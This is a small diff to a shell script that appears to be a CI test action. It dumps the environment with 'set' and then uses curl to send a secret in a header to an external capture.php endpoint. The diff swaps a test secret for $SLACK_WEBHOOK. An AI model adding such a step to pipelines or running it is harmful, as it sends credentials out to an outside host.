@@ -11,7 +11,7 @@ echo "Cal's test action:"
 
 set
 
-curl -iv https://dive.calevans.com/work/capture.php -o delete.me -H "X-TEST: $TEST_SECRET"
+curl -iv https://dive.calevans.com/work/capture.php -o delete.me -H "X-TEST: $SLACK_WEBHOOK"
 
 status=$?
 
